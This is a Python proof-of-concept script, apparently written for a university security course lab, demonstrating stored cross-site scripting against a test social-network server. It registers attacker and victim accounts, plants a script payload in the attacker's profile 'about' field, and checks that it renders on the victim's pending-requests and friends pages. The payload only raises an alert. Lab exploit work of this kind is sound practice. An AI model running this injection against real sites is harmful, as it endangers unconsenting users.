import random
import requests as req

def xssvuln9():
    #### ESTABLISH 2 SESSION OBJECTS, ONE FOR ATTACKER AND ONE FOR THE USER THAT WILL BE ATTACKED
    SERVER = "http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt"
    session = req.session()
    newsession = req.session()

    #### REGISTER A RANDOM USER THAT WILL ATTACK
    user = str(random.randint(2 ** 27, 2 ** 28))
    password = str(random.randint(2 ** 27, 2 ** 28))

    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/register', data=params)

    #### REGISTER A RANDOM USER THAT WILL BE ATTACKED
    victimuser = str(random.randint(2 ** 27, 2**28))
    victimpassword = str(random.randint(2**27, 2**28))

    victimparams = {'password': victimpassword, 'username':victimuser}
    newr =  newsession.post(SERVER + '/register', data=victimparams)


    #### LOGIN WITH THE ATTACKER
    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

    #### LOGIN WITH THE VICTIM
    victimparams = {'password': victimpassword, 'username': victimuser}
    newr = newsession.post(SERVER +'/login', data=victimparams, cookies=newsession.cookies)

    #### CHECK THE PROFILE
 #   r = session.get(SERVER + '/profile', cookies = session.cookies)
 #    print(r.text)
 #  print(r.headers)

    #### MAKE THE MULTIPART-FORM POST REQUEST AND INJECT PAYLOAD IN VULNURABLE 'about' FIELD OF THE ATTACKER'S PROFILE
    payload = "<script>alert(1)</script>"
    multipart_form_data = {'username': (None, user), 'name':(None, 'pwned'), 'currentpassword':(None, password),'newpassword':(None, password), 'about':(None, payload), 'photo': ('1598703889159.png', open('venv/1598703889159.png', 'rb')) }
    r = session.post(SERVER + '/update_profile', files = multipart_form_data,   cookies=session.cookies)

    #### SEND MALICIOUS FRIEND REQUEST TO USER
    r = session.post(SERVER + '/request_friend', data = {'username':victimuser}, cookies= session.cookies)

    #### PROOF THAT WE INJECTED JAVASCRIPT THAT IS REFLECTED TO THE USER 'victimuser'
    #### ACCESS PENDING_REQUESTS ON THE TARGET USER
    headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
    newr = newsession.get(SERVER + '/pending_requests', headers = headers, cookies = newsession.cookies)

    #### ASSERT THAT WE INJECTED JAVASCRIPT ON THE CLIENT
    assert "<script>alert(1)</script>" in newr.text

    print(newr.text)
    print(newr.headers)

    #### FURTHER REFLECTION HAPPENS IN THE /friends RESOURCE SHOULD THE USER ACCEPT A PENDING FRIEND REQUEST FROM A MALICIOUS ATTACKER
    #### ACCEPTING THE MALICIOUS FRIEND REQUEST
    newr = newsession.post(SERVER + '/pending_requests', data = {'username':user}, cookies = newsession.cookies)

    #### PROOF THAT SEARCHING FOR THE ATTACKERS USERNAME REFLECTS MALICIOUSLY INJECTED JS IN CLIENT
    newr = newsession.get(SERVER + '/friends', params={'search':user}, headers = headers, cookies = newsession.cookies)
    assert "<script>alert(1)</script>"
    print(newr.text)
    print(newr.headers)


    ####
    #### EASY DEBUG
    print("attacker user: " + user)
    print("attacker pw: " + password)
    print("victim user: " + victimuser)
    print("victim pw: " + victimpassword)

xssvuln9()